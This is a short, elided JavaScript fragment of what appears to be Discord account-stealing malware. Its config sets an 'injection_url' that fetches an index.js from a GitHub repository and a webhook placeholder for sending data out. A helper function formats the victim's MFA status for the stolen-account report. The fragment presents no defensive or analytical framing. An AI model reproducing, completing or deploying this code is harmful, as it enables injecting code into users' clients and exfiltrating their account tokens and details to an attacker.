...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/Mikey-y/inject/main/index.js",
    webhook: "%WEBHOOK%",
...
const GetMFA = (bouki) => {
    switch (bouki) {
        case true:
            return ":lock: `MFA Enabled`"
        case false:
            return ":lock: `MFA Not Enabled`"
        default:
            return ":lock: `MFA Unknown`"
    }
}
